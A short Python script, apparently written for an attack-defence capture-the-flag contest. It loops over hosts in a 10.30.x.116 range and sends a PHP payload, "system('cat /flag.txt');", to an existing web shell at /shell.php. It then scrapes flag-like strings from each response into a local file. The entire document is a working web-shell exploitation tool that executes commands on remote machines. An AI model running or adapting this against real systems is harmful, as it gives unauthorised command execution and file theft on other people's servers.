import requests
import re

ur='http://10.30.'
url='.116/shell.php'
for i in range(1,2,1):
    i=str(i)
    sb=ur+i+url
    pay={'shell':"system('cat /flag.txt');"}
    try:
        a=requests.post(url=sb,data=pay,timeout=2).text
        b=re.findall(r'\w{15,60}',a)
    except:
        b=''
    if len(b)>0:
        for i in b:
            with open ("1.txt","a+") as f:
                f.write(sb+' '+i+'\n')